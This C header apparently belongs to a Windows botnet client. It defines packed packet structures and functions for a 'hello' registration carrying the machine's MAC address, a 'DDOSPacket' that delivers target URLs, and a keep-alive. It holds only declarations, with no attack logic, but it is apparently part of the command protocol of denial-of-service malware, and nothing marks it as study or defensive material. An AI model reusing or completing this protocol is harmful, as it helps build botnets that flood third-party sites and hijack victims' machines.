#ifndef PACKET_H
#define PACKET_H

#include <stdint.h>
#include <winsock2.h>

#pragma pack(push, 1)
typedef struct {
    uint16_t size;
    uint8_t version;
    uint8_t type;
    uint8_t mac[6];
    uint8_t crc;
} HelloPacket;
#pragma pack(pop)

int hello_packet(SOCKET sock, const uint8_t* mac);

#pragma pack(push, 1)
typedef struct {
    uint16_t size;
    uint8_t version;
    uint8_t type;
    uint8_t crc;
    char urls[];
} DDOSPacket;
#pragma pack(pop)

int ddos_packet(SOCKET sock, const char *urls);

int keep_alive(SOCKET sock);

#endif
